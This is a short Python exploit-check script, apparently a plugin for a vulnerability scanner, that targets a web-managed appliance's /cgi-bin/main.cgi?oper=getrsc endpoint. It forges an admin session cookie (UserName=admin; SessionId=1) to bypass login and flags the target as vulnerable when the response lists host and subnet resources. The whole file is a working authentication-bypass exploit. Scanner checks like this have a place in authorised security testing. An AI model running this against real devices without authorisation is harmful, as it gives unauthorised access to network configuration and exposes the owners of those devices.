#!/usr/bin/python
# -*- coding:utf-8
import re,sys
sys.path.append('..')
from expFunc import *

url=sys.argv[1]
findContent ="主机和子网资源"
payload ="/cgi-bin/main.cgi?oper=getrsc"

def main():
    res = HttpGet(url+payload,"cookie:UserName=admin; SessionId=1; FirstVist=1; Skin=1; tunnel=1");
    if res[0].find(findContent)!= -1:
        print(Result+url+info);

main()